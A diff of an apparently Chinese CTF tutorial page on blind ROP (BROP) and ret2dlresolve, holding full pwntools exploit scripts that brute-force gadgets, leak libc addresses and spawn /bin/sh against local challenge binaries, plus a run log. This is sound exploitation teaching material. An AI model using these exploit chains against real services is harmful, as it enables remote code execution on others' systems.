+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_stop_addr</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    addr <span class="token operator">=</span> <span class="token number">0x400000</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+            payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span> <span class="token string">'one success addr: 0x%x'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> addr
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            addr <span class="token operator">+=</span> <span class="token number">1</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里我们直接尝试 64 位程序没有开启 PIE 的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址</p>
 <pre><code>one success stop gadget addr: 0x4006b6</code></pre><h4 id="识别-brop-gadgets"><a href="#识别-brop-gadgets" class="headerlink" title="识别 brop gadgets"></a>识别 brop gadgets</h4><p>下面，我们根据上面介绍的原理来得到对应的 brop gadgets 地址。构造如下，get_brop_gadget 是为了得到可能的 brop gadget，后面的 check_brop_gadget 是为了检查。</p>
-<pre><code>def get_brop_gadget(length, stop_gadget, addr):
-    try:
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
-            stop_gadget) + p64(0) * 10
-        sh.sendline(payload)
-        content = sh.recv()
-        sh.close()
-        print content
-        # stop gadget returns memory
-        if not content.startswith('WelCome'):
-            return False
-        return True
-    except Exception:
-        sh.close()
-        return False
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_brop_gadget</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+        payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+            stop_gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span>
+        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span> content
+        <span class="token comment" spellcheck="true"># stop gadget returns memory</span>
+        <span class="token keyword">if</span> <span class="token operator">not</span> content<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'WelCome'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">False</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
 
 
-def check_brop_gadget(length, addr):
-    try:
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
-        sh.sendline(payload)
-        content = sh.recv()
-        sh.close()
-        return False
-    except Exception:
-        sh.close()
-        return True
+<span class="token keyword">def</span> <span class="token function">check_brop_gadget</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+        payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">10</span>
+        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
 
 
-##length = getbufferflow_length()
-length = 72
-##get_stop_addr(length)
-stop_gadget = 0x4006b6
-addr = 0x400740
-while 1:
-    print hex(addr)
-    if get_brop_gadget(length, stop_gadget, addr):
-        print 'possible brop gadget: 0x%x' % addr
-        if check_brop_gadget(length, addr):
-            print 'success brop gadget: 0x%x' % addr
-            break
-    addr += 1</code></pre><p>这样，我们基本得到了 brop 的 gadgets 地址 0x4007ba</p>
+<span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
+length <span class="token operator">=</span> <span class="token number">72</span>
+<span class="token comment" spellcheck="true">##get_stop_addr(length)</span>
+stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
+addr <span class="token operator">=</span> <span class="token number">0x400740</span>
+<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> get_brop_gadget<span class="token punctuation">(</span>length<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">'possible brop gadget: 0x%x'</span> <span class="token operator">%</span> addr
+        <span class="token keyword">if</span> check_brop_gadget<span class="token punctuation">(</span>length<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">'success brop gadget: 0x%x'</span> <span class="token operator">%</span> addr
+            <span class="token keyword">break</span>
+    addr <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这样，我们基本得到了 brop 的 gadgets 地址 0x4007ba</p>
 <h4 id="确定-puts-plt-地址"><a href="#确定-puts-plt-地址" class="headerlink" title="确定 puts@plt 地址"></a>确定 puts@plt 地址</h4><p>根据上面，所说我们可以构造如下 payload 来进行获取</p>
 <pre><code>payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</code></pre><p>具体函数如下</p>
-<pre><code>def get_puts_addr(length, rdi_ret, stop_gadget):
-    addr = 0x400000
-    while 1:
-        print hex(addr)
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
-            addr) + p64(stop_gadget)
-        sh.sendline(payload)
-        try:
-            content = sh.recv()
-            if content.startswith('\x7fELF'):
-                print 'find puts@plt addr: 0x%x' % addr
-                return addr
-            sh.close()
-            addr += 1
-        except Exception:
-            sh.close()
-            addr += 1</code></pre><p>最后根据 plt 的结构，选择 0x400560 作为 puts@plt</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_puts_addr</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    addr <span class="token operator">=</span> <span class="token number">0x400000</span>
+    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+        sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+        payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+            addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            content <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> content<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'\x7fELF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span> <span class="token string">'find puts@plt addr: 0x%x'</span> <span class="token operator">%</span> addr
+                <span class="token keyword">return</span> addr
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            addr <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            addr <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后根据 plt 的结构，选择 0x400560 作为 puts@plt</p>
 <h4 id="泄露-puts-got-地址"><a href="#泄露-puts-got-地址" class="headerlink" title="泄露 puts@got 地址"></a>泄露 puts@got 地址</h4><p>在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。代码如下</p>
-<pre><code>def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
-    sh = remote('127.0.0.1', 9999)
-    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
-        puts_plt) + p64(stop_gadget)
-    sh.recvuntil('password?\n')
-    sh.sendline(payload)
-    try:
-        data = sh.recv()
-        sh.close()
-        try:
-            data = data[:data.index("\nWelCome")]
-        except Exception:
-            data = data
-        if data == "":
-            data = '\x00'
-        return data
-    except Exception:
-        sh.close()
-        return None
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> leak_addr<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+        puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"\nWelCome"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            data <span class="token operator">=</span> data
+        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> <span class="token string">'\x00'</span>
+        <span class="token keyword">return</span> data
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> None
 
 
-##length = getbufferflow_length()
-length = 72
-##stop_gadget = get_stop_addr(length)
-stop_gadget = 0x4006b6
-##brop_gadget = find_brop_gadget(length,stop_gadget)
-brop_gadget = 0x4007ba
-rdi_ret = brop_gadget + 9
-##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
-puts_plt = 0x400560
-addr = 0x400000
-result = ""
-while addr &lt; 0x401000:
-    print hex(addr)
-    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
-    if data is None:
-        continue
-    else:
-        result += data
-    addr += len(data)
-with open('code', 'wb') as f:
-    f.write(result)</code></pre><p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是 “”, 那说明我们遇到了’\x00’，因为 puts 是输出字符串，字符串是以’\x00’为终止符的。之后利用 ida 打开 binary 模式，首先在 edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000，然后找到偏移 0x560 处，如下</p>
+<span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
+length <span class="token operator">=</span> <span class="token number">72</span>
+<span class="token comment" spellcheck="true">##stop_gadget = get_stop_addr(length)</span>
+stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
+<span class="token comment" spellcheck="true">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+brop_gadget <span class="token operator">=</span> <span class="token number">0x4007ba</span>
+rdi_ret <span class="token operator">=</span> brop_gadget <span class="token operator">+</span> <span class="token number">9</span>
+<span class="token comment" spellcheck="true">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span>
+puts_plt <span class="token operator">=</span> <span class="token number">0x400560</span>
+addr <span class="token operator">=</span> <span class="token number">0x400000</span>
+result <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">while</span> addr <span class="token operator">&lt;</span> <span class="token number">0x401000</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    data <span class="token operator">=</span> leak<span class="token punctuation">(</span>length<span class="token punctuation">,</span> rdi_ret<span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> stop_gadget<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> data <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> data
+    addr <span class="token operator">+=</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是 “”, 那说明我们遇到了’\x00’，因为 puts 是输出字符串，字符串是以’\x00’为终止符的。之后利用 ida 打开 binary 模式，首先在 edit-&gt;segments-&gt;rebase program 将程序的基地址改为 0x400000，然后找到偏移 0x560 处，如下</p>
 <pre><code>seg000:0000000000400560                 db 0FFh
 seg000:0000000000400561                 db  25h ; %
 seg000:0000000000400562                 db 0B2h ;
@@ -1566,33 +1587,34 @@ seg000:0000000000400566 ; ------------------------------------------------------
 seg000:0000000000400566                 push    0
 seg000:000000000040056B                 jmp     loc_400550
 seg000:000000000040056B ; ---------------------------------------------------------------------------</code></pre><p>这说明，puts@got 的地址为 0x601018。</p>
-<h4 id="程序利用"><a href="#程序利用" class="headerlink" title="程序利用"></a>程序利用</h4><pre><code>##length = getbufferflow_length()
-length = 72
-##stop_gadget = get_stop_addr(length)
-stop_gadget = 0x4006b6
-##brop_gadget = find_brop_gadget(length,stop_gadget)
-brop_gadget = 0x4007ba
-rdi_ret = brop_gadget + 9
-##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
-puts_plt = 0x400560
-##leakfunction(length, rdi_ret, puts_plt, stop_gadget)
-puts_got = 0x601018
+<h4 id="程序利用"><a href="#程序利用" class="headerlink" title="程序利用"></a>程序利用</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##length = getbufferflow_length()</span>
+length <span class="token operator">=</span> <span class="token number">72</span>
+<span class="token comment" spellcheck="true">##stop_gadget = get_stop_addr(length)</span>
+stop_gadget <span class="token operator">=</span> <span class="token number">0x4006b6</span>
+<span class="token comment" spellcheck="true">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+brop_gadget <span class="token operator">=</span> <span class="token number">0x4007ba</span>
+rdi_ret <span class="token operator">=</span> brop_gadget <span class="token operator">+</span> <span class="token number">9</span>
+<span class="token comment" spellcheck="true">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span>
+puts_plt <span class="token operator">=</span> <span class="token number">0x400560</span>
+<span class="token comment" spellcheck="true">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span>
+puts_got <span class="token operator">=</span> <span class="token number">0x601018</span>
 
-sh = remote('127.0.0.1', 9999)
-sh.recvuntil('password?\n')
-payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
-    stop_gadget)
-sh.sendline(payload)
-data = sh.recvuntil('\nWelCome', drop=True)
-puts_addr = u64(data.ljust(8, '\x00'))
-libc = LibcSearcher('puts', puts_addr)
-libc_base = puts_addr - libc.dump('puts')
-system_addr = libc_base + libc.dump('system')
-binsh_addr = libc_base + libc.dump('str_bin_sh')
-payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
-    system_addr) + p64(stop_gadget)
-sh.sendline(payload)
-sh.interactive()</code></pre><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。</p>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'password?\n'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+    stop_gadget<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nWelCome'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> length <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
+    system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stop_gadget<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。</p>
 <h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。</p>
 <p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p>
 <h3 id="思路1-直接控制重定位表项的相关内容"><a href="#思路1-直接控制重定位表项的相关内容" class="headerlink" title="思路1 - 直接控制重定位表项的相关内容"></a>思路1 - 直接控制重定位表项的相关内容</h3><p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p>
@@ -1646,19 +1668,18 @@ p<span class="token punctuation">.</span>send<span class="token punctuation">(</
 p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>运行效果如下</p>
-<pre class="line-numbers language-python"><code class="language-python">❯ python exp<span class="token operator">-</span>no<span class="token operator">-</span>relro<span class="token punctuation">.</span>py
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./main_no_relro_32'</span><span class="token punctuation">:</span> pid <span class="token number">35093</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'</span>
-    Arch<span class="token punctuation">:</span>     i386<span class="token number">-32</span><span class="token operator">-</span>little
-    RELRO<span class="token punctuation">:</span>    No RELRO
-    Stack<span class="token punctuation">:</span>    No canary found
-    NX<span class="token punctuation">:</span>       NX enabled
-    PIE<span class="token punctuation">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Loaded <span class="token number">10</span> cached gadgets <span class="token keyword">for</span> <span class="token string">'./main_no_relro_32'</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+<pre><code>❯ python exp-no-relro.py
+[+] Starting local process './main_no_relro_32': pid 35093
+[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] Loaded 10 cached gadgets for './main_no_relro_32'
+[*] Switching to interactive mode
 $ ls
-exp<span class="token operator">-</span>no<span class="token operator">-</span>relro<span class="token punctuation">.</span>py  main_no_relro_32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。</p>
+exp-no-relro.py  main_no_relro_32</code></pre><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。</p>
 <pre class="line-numbers language-shell"><code class="language-shell">❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
 ❯ checksec main_partial_relro_32
 [*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
@@ -1675,7 +1696,7 @@ al-relro/main_partial_relro_32'
